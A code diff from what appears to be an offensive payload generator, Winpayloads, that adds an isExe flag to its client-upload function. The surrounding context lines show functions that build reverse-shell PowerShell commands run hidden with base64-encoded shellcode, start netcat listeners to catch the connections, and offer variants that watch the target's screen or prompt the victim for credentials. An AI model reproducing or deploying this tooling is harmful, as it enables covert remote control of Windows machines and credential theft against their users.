@@ -6,10 +6,10 @@ from sockets import *
 
 payloaddir = '/etc/winpayloads'
 
-def checkClientUpload(payloadname, powershellExec):
+def checkClientUpload(payloadname, powershellExec, isExe):
     from menu import clientMenuOptions
     if len(clientMenuOptions.keys()) > 2:
-        DoClientUpload(payloaddir,payloadname,powershellExec)
+        DoClientUpload(payloaddir,payloadname,powershellExec,isExe)
     else:
         print powershellExec
 
@@ -120,7 +120,7 @@ def reversePowerShellGeneration(payloadchoice,payloadname):
     shellcode = payloadchoice % (ipaddr,portnum,"|%{0}")
     powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
     print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
-    checkClientUpload(payloadname,powershellExec)
+    checkClientUpload(payloadname,powershellExec,isExe=False)
     os.system('nc -lvp %s'%portnum)
     return True
 
@@ -131,7 +131,7 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     shellcode = payloadchoice % (ipaddr,portnum)
     powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
     print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
-    checkClientUpload(payloadname,powershellExec)
+    checkClientUpload(payloadname,powershellExec,isExe=False)
     os.system('nc -lvp %s | nc -lvp 80 &'%(portnum))
     os.system('firefox 127.0.0.1')
     return True
@@ -143,6 +143,6 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     shellcode = payloadchoice % (ipaddr,portnum)
     powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
     print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
-    checkClientUpload(payloadname,powershellExec)
+    checkClientUpload(payloadname,powershellExec,isExe=False)
     os.system('nc -lvp %s'%(portnum))
     return True
